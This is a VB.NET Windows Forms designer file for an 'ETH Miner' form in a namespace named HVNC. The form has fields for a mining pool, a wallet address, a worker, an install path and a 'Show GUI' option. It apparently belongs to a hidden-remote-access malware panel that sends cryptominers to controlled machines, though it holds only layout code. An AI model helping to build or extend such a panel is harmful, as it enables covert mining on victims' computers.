Namespace HVNC
	Partial Public Class FrmMiner
		''' <summary>
		''' Required designer variable.
		''' </summary>
		Private components As System.ComponentModel.IContainer = Nothing

		''' <summary>
		''' Clean up any resources being used.
		''' </summary>
		''' <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		Protected Overrides Sub Dispose(ByVal disposing As Boolean)
			If disposing AndAlso (components IsNot Nothing) Then
				components.Dispose()
			End If
			MyBase.Dispose(disposing)
		End Sub

		#Region "Windows Form Designer generated code"

		''' <summary>
		''' Required method for Designer support - do not modify
		''' the contents of this method with the code editor.
		''' </summary>
		Private Sub InitializeComponent()
			Dim resources As New System.ComponentModel.ComponentResourceManager(GetType(FrmMiner))
			Me.button1 = New System.Windows.Forms.Button()
			Me.label1 = New System.Windows.Forms.Label()
			Me.label2 = New System.Windows.Forms.Label()
			Me.label3 = New System.Windows.Forms.Label()
			Me.numericUpDown1 = New System.Windows.Forms.NumericUpDown()
			Me.checkBox1 = New System.Windows.Forms.CheckBox()
			Me.comboBox1 = New System.Windows.Forms.ComboBox()
			Me.label4 = New System.Windows.Forms.Label()
			Me.textBox2 = New System.Windows.Forms.TextBox()
			Me.groupBox1 = New System.Windows.Forms.GroupBox()
			Me.radioButtonETC = New System.Windows.Forms.RadioButton()
			Me.radioButtonETH = New System.Windows.Forms.RadioButton()
			Me.statusStrip1 = New System.Windows.Forms.StatusStrip()
			Me.toolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
			Me.textBox3 = New System.Windows.Forms.TextBox()
			Me.label5 = New System.Windows.Forms.Label()
			Me.comboBox2 = New System.Windows.Forms.ComboBox()
			DirectCast(Me.numericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
			Me.groupBox1.SuspendLayout()
			Me.statusStrip1.SuspendLayout()
			Me.SuspendLayout()
			' 
			' button1
			' 
			Me.button1.Location = New System.Drawing.Point(259, 133)
			Me.button1.Name = "button1"
			Me.button1.Size = New System.Drawing.Size(145, 35)
			Me.button1.TabIndex = 0
			Me.button1.Text = "Send"
			Me.button1.UseVisualStyleBackColor = True
'			Me.button1.Click += New System.EventHandler(Me.button1_Click)
			' 
			' label1
			' 
			Me.label1.AutoSize = True
			Me.label1.Location = New System.Drawing.Point(50, 15)
			Me.label1.Name = "label1"
			Me.label1.Size = New System.Drawing.Size(34, 13)
			Me.label1.TabIndex = 3
			Me.label1.Text = "Pool :"
			' 
			' label2
			' 
			Me.label2.AutoSize = True
			Me.label2.Location = New System.Drawing.Point(49, 42)
			Me.label2.Name = "label2"
			Me.label2.Size = New System.Drawing.Size(35, 13)
			Me.label2.TabIndex = 4
			Me.label2.Text = "User :"
			' 
			' label3
			' 
			Me.label3.AutoSize = True
			Me.label3.Location = New System.Drawing.Point(322, 15)
			Me.label3.Name = "label3"
			Me.label3.Size = New System.Drawing.Size(10, 13)
			Me.label3.TabIndex = 5
			Me.label3.Text = ":"
			' 
			' numericUpDown1
			' 
			Me.numericUpDown1.Location = New System.Drawing.Point(338, 13)
			Me.numericUpDown1.Maximum = New Decimal(New Integer() { 9999, 0, 0, 0})
			Me.numericUpDown1.Minimum = New Decimal(New Integer() { 1000, 0, 0, 0})
			Me.numericUpDown1.Name = "numericUpDown1"
			Me.numericUpDown1.Size = New System.Drawing.Size(76, 20)
			Me.numericUpDown1.TabIndex = 6
			Me.numericUpDown1.Value = New Decimal(New Integer() { 4444, 0, 0, 0})
			' 
			' checkBox1
			' 
			Me.checkBox1.AutoSize = True
			Me.checkBox1.Checked = True
			Me.checkBox1.CheckState = System.Windows.Forms.CheckState.Checked
			Me.checkBox1.Location = New System.Drawing.Point(274, 98)
			Me.checkBox1.Name = "checkBox1"
			Me.checkBox1.Size = New System.Drawing.Size(75, 17)
			Me.checkBox1.TabIndex = 12
			Me.checkBox1.Text = "Show GUI"
			Me.checkBox1.UseVisualStyleBackColor = True
			' 
			' comboBox1
			' 
			Me.comboBox1.FormattingEnabled = True
			Me.comboBox1.Items.AddRange(New Object() { "Desktop", "Local", "Program Files", "Roaming", "Temp"})
			Me.comboBox1.Location = New System.Drawing.Point(92, 96)
			Me.comboBox1.Name = "comboBox1"
			Me.comboBox1.Size = New System.Drawing.Size(161, 21)
			Me.comboBox1.TabIndex = 13
			Me.comboBox1.Text = "Desktop"
			' 
			' label4
			' 
			Me.label4.AutoSize = True
			Me.label4.Location = New System.Drawing.Point(50, 99)
			Me.label4.Name = "label4"
			Me.label4.Size = New System.Drawing.Size(35, 13)
			Me.label4.TabIndex = 14
			Me.label4.Text = "Path :"
			' 
			' textBox2
			' 
			Me.textBox2.Location = New System.Drawing.Point(92, 39)
			Me.textBox2.Name = "textBox2"
			Me.textBox2.Size = New System.Drawing.Size(322, 20)
			Me.textBox2.TabIndex = 15
			Me.textBox2.Text = "0xF03CDfd612D86084dD54FBA417C52368e0b20031"
			' 
			' groupBox1
			' 
			Me.groupBox1.Controls.Add(Me.radioButtonETC)
			Me.groupBox1.Controls.Add(Me.radioButtonETH)
			Me.groupBox1.Location = New System.Drawing.Point(14, 123)
			Me.groupBox1.Name = "groupBox1"
			Me.groupBox1.Size = New System.Drawing.Size(224, 50)
			Me.groupBox1.TabIndex = 16
			Me.groupBox1.TabStop = False
			' 
			' radioButtonETC
			' 
			Me.radioButtonETC.AutoSize = True
			Me.radioButtonETC.Location = New System.Drawing.Point(59, 19)
			Me.radioButtonETC.Name = "radioButtonETC"
			Me.radioButtonETC.Size = New System.Drawing.Size(46, 17)
			Me.radioButtonETC.TabIndex = 3
			Me.radioButtonETC.Text = "ETC"
			Me.radioButtonETC.UseVisualStyleBackColor = True
			' 
			' radioButtonETH
			' 
			Me.radioButtonETH.AutoSize = True
			Me.radioButtonETH.Checked = True
			Me.radioButtonETH.Location = New System.Drawing.Point(6, 19)
			Me.radioButtonETH.Name = "radioButtonETH"
			Me.radioButtonETH.Size = New System.Drawing.Size(47, 17)
			Me.radioButtonETH.TabIndex = 2
			Me.radioButtonETH.TabStop = True
			Me.radioButtonETH.Text = "ETH"
			Me.radioButtonETH.UseVisualStyleBackColor = True
			' 
			' statusStrip1
			' 
			Me.statusStrip1.Location = New System.Drawing.Point(0, 181)
			Me.statusStrip1.Name = "statusStrip1"
			Me.statusStrip1.Size = New System.Drawing.Size(425, 22)
			Me.statusStrip1.TabIndex = 17
			Me.statusStrip1.Text = "statusStrip1"
			' 
			' toolStripStatusLabel1
			' 
			Me.toolStripStatusLabel1.Name = "toolStripStatusLabel1"
			Me.toolStripStatusLabel1.Size = New System.Drawing.Size(60, 17)
			Me.toolStripStatusLabel1.Text = "Logs : Idle"
			' 
			' textBox3
			' 
			Me.textBox3.Location = New System.Drawing.Point(92, 65)
			Me.textBox3.Name = "textBox3"
			Me.textBox3.Size = New System.Drawing.Size(94, 20)
			Me.textBox3.TabIndex = 19
			Me.textBox3.Text = "Worker1"
			' 
			' label5
			' 
			Me.label5.AutoSize = True
			Me.label5.Location = New System.Drawing.Point(49, 68)
			Me.label5.Name = "label5"
			Me.label5.Size = New System.Drawing.Size(36, 13)
			Me.label5.TabIndex = 18
			Me.label5.Text = "Pass :"
			' 
			' comboBox2
			' 
			Me.comboBox2.FormattingEnabled = True
			Me.comboBox2.Items.AddRange(New Object() { "---------------------", "            ETH", "---------------------", "asia1.ethermine.org", "eu1.ethermine.org", "us1.ethermine.org", "us2.ethermine.org", "---------------------", "            ETC", "---------------------", "asia1-etc.ethermine.org", "eu1-etc.ethermine.org", "us1-etc.ethermine.org"})
			Me.comboBox2.Location = New System.Drawing.Point(92, 12)
			Me.comboBox2.Name = "comboBox2"
			Me.comboBox2.Size = New System.Drawing.Size(224, 21)
			Me.comboBox2.TabIndex = 20
			Me.comboBox2.Text = "eu1.ethermine.org"
			' 
			' FrmMiner
			' 
			Me.AutoScaleDimensions = New System.Drawing.SizeF(6F, 13F)
			Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
			Me.ClientSize = New System.Drawing.Size(425, 203)
			Me.Controls.Add(Me.comboBox2)
			Me.Controls.Add(Me.textBox3)
			Me.Controls.Add(Me.label5)
			Me.Controls.Add(Me.statusStrip1)
			Me.Controls.Add(Me.groupBox1)
			Me.Controls.Add(Me.textBox2)
			Me.Controls.Add(Me.label4)
			Me.Controls.Add(Me.comboBox1)
			Me.Controls.Add(Me.checkBox1)
			Me.Controls.Add(Me.numericUpDown1)
			Me.Controls.Add(Me.label3)
			Me.Controls.Add(Me.label2)
			Me.Controls.Add(Me.label1)
			Me.Controls.Add(Me.button1)
			Me.Icon = (DirectCast(resources.GetObject("$this.Icon"), System.Drawing.Icon))
			Me.MaximizeBox = False
			Me.MaximumSize = New System.Drawing.Size(441, 242)
			Me.MinimizeBox = False
			Me.MinimumSize = New System.Drawing.Size(441, 242)
			Me.Name = "FrmMiner"
			Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "ETH Miner"
			Me.TopMost = True
'			Me.Load += New System.EventHandler(Me.Miner_Load)
			DirectCast(Me.numericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
			Me.groupBox1.ResumeLayout(False)
			Me.groupBox1.PerformLayout()
			Me.statusStrip1.ResumeLayout(False)
			Me.statusStrip1.PerformLayout()
			Me.ResumeLayout(False)
			Me.PerformLayout()

		End Sub

		#End Region

		Private WithEvents button1 As System.Windows.Forms.Button
		Private label1 As System.Windows.Forms.Label
		Private label2 As System.Windows.Forms.Label
		Private label3 As System.Windows.Forms.Label
		Private numericUpDown1 As System.Windows.Forms.NumericUpDown
		Private checkBox1 As System.Windows.Forms.CheckBox
		Private comboBox1 As System.Windows.Forms.ComboBox
		Private label4 As System.Windows.Forms.Label
		Private textBox2 As System.Windows.Forms.TextBox
		Private groupBox1 As System.Windows.Forms.GroupBox
		Private statusStrip1 As System.Windows.Forms.StatusStrip
		Private toolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
		Private radioButtonETH As System.Windows.Forms.RadioButton
		Private textBox3 As System.Windows.Forms.TextBox
		Private label5 As System.Windows.Forms.Label
		Private comboBox2 As System.Windows.Forms.ComboBox
		Private radioButtonETC As System.Windows.Forms.RadioButton
	End Class
End Namespace